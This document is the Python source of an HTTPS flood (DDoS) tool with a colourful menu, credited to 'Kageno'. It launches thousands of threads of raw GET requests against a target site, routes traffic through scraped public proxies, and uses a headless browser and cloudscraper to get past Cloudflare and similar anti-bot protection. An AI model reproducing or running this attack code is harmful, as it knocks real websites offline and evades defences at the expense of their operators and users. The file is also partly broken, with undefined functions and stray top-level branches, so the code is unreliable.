# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

#region get
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all").text
        r += requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        open("./resources/socks5.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        open("./resources/http.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r

def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r').read().split('\n')
    return True

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

##############################################################################################
def cs_l7():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"site      "+Fore.LIGHTCYAN_EX+"= "+Fore.LIGHTGREEN_EX)
    target = input()
    thread = 9999
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"time      "+Fore.LIGHTCYAN_EX+"= "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t

##############################################################################################
def cs_l7_js():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"site      "+Fore.LIGHTCYAN_EX+"= "+Fore.LIGHTGREEN_EX)
    urlsite = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE +"sec      "+Fore.LIGHTCYAN_EX+" = "+Fore.LIGHTGREEN_EX)
    time = input()
    return urlsite, time
##############################################################################################

#region HEAD

def Launch(url, th, t, method): #testing
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            exec("threading.Thread(target=Attack"+method+", args=(url, until)).start()")
        except:
            pass

def LaunchNULL(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: null\r\n"
    req += "Referrer: null\r\n"
    req += CSSP(target) + "\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackNULL, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackNULL(target, until_datetime, req): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

#region cl
def Launchcl(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=Attackcl, args=(url, until, scraper))
            thd.start()
        except:
            pass

def Attackcl(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion


#region clpx
def Launchclpx(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=Attackclpx, args=(url, until, scraper))
            thd.start()
        except:
            pass

def Attackclpx(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion

#region CFPRO
def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCSREQ(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass
#endregion

#region testzone
def attackcs(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchcs, args=(url, timer)).start()

def Launchcs(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
           threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
                timelol = time.time() + int(timer)
                req = "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
                req += "Cache-Control: no-cache\r\n"
                req += "User-Agent: " + random.choice(ua) + "\r\n"
                req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                req += "Sec-Fetch-Site: same-origin\r\n"
                req += "Sec-GPC: 1\r\n"
                req += "Sec-Fetch-Mode: navigate\r\n"
                req += "Sec-Fetch-Dest: document\r\n"
                req += "Upgrade-Insecure-Requests: 1\r\n"
                req += "Connection: Keep-Alive\r\n\r\n"
                while time.time() < timelol:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((str(urlparse(url).netloc), int(443)))
                        ctx = ssl.create_default_context()
                        s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
                        s.send(str.encode(req))
                        try:
                            for _ in range(100):
                                s.send(str.encode(req))
                                s.send(str.encode(req))
                        except:
                            s.close()
                    except:
                        s.close()
# endregion

def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')
##############################################################################################
def help():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                                                                         \n")
    stdout.write("                                                                                         \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════════════════════════════════════════════════╗\n")
    stdout.write("             "+Fore.LIGHTRED_EX             +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"methods   "+Fore.LIGHTRED_EX+"|"+Fore.LIGHTWHITE_EX+" Show Methods Public                    "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTRED_EX             +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools     "+Fore.LIGHTRED_EX+"|"+Fore.LIGHTWHITE_EX+" Show tools                             "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def methods():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                                                                         \n")
    stdout.write("                                                                                         \n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╔══════════════════════════════════════════════════════╗\n")
    stdout.write("            "+Fore.LIGHTRED_EX             +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cs     "+Fore.LIGHTRED_EX+" |"+Fore.LIGHTWHITE_EX+" cs method                                "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("            "+Fore.LIGHTBLUE_EX            +"╚══════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def px():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                                                                         \n")
    stdout.write("                                                                                         \n")
    stdout.write("    " + Fore.LIGHTBLACK_EX + " Special Kageno Proxy          \n")
    stdout.write("    " + Fore.LIGHTCYAN_EX + "╔══════════════════════════════════════════════════════╗\n")
    stdout.write("    " + Fore.LIGHTRED_EX +   "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "cspx"   + Fore.LIGHTRED_EX +      "|" + Fore.LIGHTWHITE_EX + "No Comment                                   "+Fore.LIGHTRED_EX+" ║\n")
    stdout.write("    " + Fore.LIGHTBLUE_E +   "╚══════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def title():
    stdout.write("                                                                                          \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"                \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╔═══════════════════════════════════════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +" [⭐ ]  Welcome To My Self" + Fore.LIGHTCYAN_EX + "                ║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX+"║ "+Fore.LIGHTWHITE_EX   +" [🌧️]  Tools Made On Date : 20 June 2023" + Fore.LIGHTCYAN_EX + "   ║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX+"║ "+Fore.LIGHTWHITE_EX   +" [☔ ]  By Kageno" + Fore.LIGHTCYAN_EX + "                         ║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX+"╚═══════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def command():
    stdout.write(Fore.LIGHTCYAN_EX+"Cs_""NatsuE"+Fore.LIGHTRED_EX+">"+Fore.LIGHTBLACK_EX+">"+Fore.LIGHTRED_EX+">"+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        clear()
        title()
    elif command == "help" or command == "?":
        help()
    elif command == "method" or command == "METHOD" or command == "methods" or command == "METHODS" or command == "Method":
        methods()
    elif command == "tools" or command == "tool":
        tools()
    elif command == "px" or command == "Special":
        px()
    elif command == "exit":
        exit()
    elif command == "test":
        target, thread, t = cs_l7()
        test1(target, thread, t)
        time.sleep(10)

    elif command == "cspx" or command == "cspx":
        if get_proxies():
            target, thread, t = cs_l7()
            threading.Thread(target=attackcs, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()

    elif command == "cs" or command == "cs":
        target, thread, t = cs_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
        
##############################################################################################     

def func():
    stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mCS7"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cs/cspx       "+Fore.RED+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")

if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('./resources/ua.txt', 'r').read().split('\n')
        clear()
        title()
        while True:
            command()
    elif len(sys.argv) == 5:
        pass
    else:
        stdout.write("Method: cspx, cs, cskill\n")
        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()
    ua = open('./resources/ua.txt', 'r').read().split('\n')
    method = sys.argv[1].rstrip()
    target = sys.argv[2].rstrip()
    thread = sys.argv[3].rstrip()
    t      = sys.argv[4].rstrip()
elif method == "cspx":
        if get_proxies():
            target, thread, t = cs_l7()
            threading.Thread(target=attackcs, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
elif method == "cs":
        target, thread, t = cs_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
else:
        stdout.write("No method found.\nMethod: cspx, cs, cskill\n")